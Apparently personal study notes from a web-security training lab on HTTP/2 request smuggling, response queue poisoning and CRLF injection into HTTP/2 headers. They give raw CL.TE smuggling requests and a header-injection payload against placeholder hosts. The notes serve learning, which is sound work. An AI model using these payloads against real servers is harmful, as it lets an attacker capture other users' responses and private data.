The vulnerabilities described in the other file, such as TE.CL or CL.TE can be used also with HTTP/2

Through BurpSuite, but remember to deselect "Update Content-Lenght" and to enable "allow HTTP/2 ALPN override"


It's possible to do Response queue posoning, in order to retrive another response, that was for another user.
In this way most of the time we can retrtive useful information

Front-end (CL)

POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
Back-end (TE)

POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n



In other scenarios, you can hide request for the Back-End Server HTTP/1.1 into the header of the Front-End Server HTTP/2 as shown below:

foo
Value

bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net (to append \r\n carriage return and line feed press shift + enter into the inspector )